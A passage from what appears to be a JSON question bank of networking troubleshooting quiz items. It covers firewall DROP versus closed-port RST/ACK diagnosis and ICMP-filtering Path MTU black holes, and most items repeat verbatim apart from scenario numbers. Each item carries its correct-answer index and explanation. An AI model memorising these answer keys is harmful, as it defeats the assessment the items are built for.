    "q": "[Troubleshooting Lab Scenario 18] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_144",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 19] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_145",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 20] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_146",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 21] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_147",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 22] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_148",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 23] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_149",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 24] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_150",
    "topic": "Connection Triage: DROP vs REJECT vs Downed Daemon",
    "difficulty": "difficult",
    "q": "[Troubleshooting Lab Scenario 25] An analyst investigates a connection failure between client 172.30.8.20 and server 172.30.8.10. In Capture A (port 8081), the client sends a SYN and then three retransmissions over 4 seconds with zero response, resulting in a curl timeout (exit code 28). In Capture B (port 8082), the client sends a SYN and receives a TCP RST/ACK within 0.3 milliseconds, resulting in a connection refused error (curl exit code 7). The server administrator claims: \"Both ports are failing, so the network firewall must be blocking both.\" How does the analyst refute the administrator using packet evidence?",
    "options": [
      "Port 8081 is indeed being blocked by a firewall DROP rule (or path severance), as proven by the total silence and SYN retransmissions; however, Port 8082 reached the server operating system, which actively returned a RST/ACK because the server itself has no daemon listening on port 8082.",
      "Both ports are functioning perfectly and the curl client software is defective.",
      "Port 8082 is blocked by an upstream BGP routing loop.",
      "The server's physical network interface card is operating in half-duplex mode."
    ],
    "correct": 0,
    "explanation": "A RST/ACK cannot generate itself out of thin air; it proves that the network path and firewalls forwarded the packet to the server, and the server's OS actively rejected it because no process was listening on 8082. Conversely, the complete silence on 8081 proves a firewall DROP rule. The fix for 8081 is network policy; the fix for 8082 is starting the server service."
  },
  {
    "id": "q_c2_m8_151",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 1] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_152",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 2] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_153",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 3] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_154",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 4] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_155",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 5] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_156",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 6] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_157",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 7] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_158",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 8] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_159",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 9] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_160",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 10] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_161",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 11] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_162",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 12] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_163",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 13] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_164",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 14] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_165",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 15] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_166",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
    "q": "[WAN Performance Incident 16] A corporate branch connects to an enterprise ERP server across an IPsec VPN tunnel with an interface MTU of 1420 bytes. Users report that web pages load quickly, but downloading standard PDF financial reports hangs indefinitely. A packet capture on the server shows the server transmitting 1514-byte frames with the Don't Fragment (DF) flag set to 1. An intermediate router drops the oversized frames and transmits ICMP Destination Unreachable (Type 3, Code 4: Fragmentation Needed and DF set) back to the server. However, the server never retransmits smaller packets and continues sending 1514-byte frames. What boundary device configuration defect caused this PMTU black hole?",
    "options": [
      "A perimeter firewall or security group dropped the inbound ICMP Type 3 Code 4 error packets, preventing the server's TCP stack from learning the Path MTU and reducing its Maximum Segment Size (MSS).",
      "The Ethernet switch dropped its MAC address table due to CAM exhaustion.",
      "The DNS resolver returned a forged AAAA record.",
      "The client's browser lacks an X.509 client certificate."
    ],
    "correct": 0,
    "explanation": "When firewalls indiscriminately block all ICMP traffic, they break RFC 1191 Path MTU Discovery. When an intermediate link cannot forward a packet larger than its MTU, it drops it and sends ICMP Type 3 Code 4. If the sending server never receives this ICMP notice, it never reduces its packet size, and large transfers hang permanently."
  },
  {
    "id": "q_c2_m8_167",
    "topic": "Transport Layer Path MTU Black Hole Forensics",
    "difficulty": "difficult",
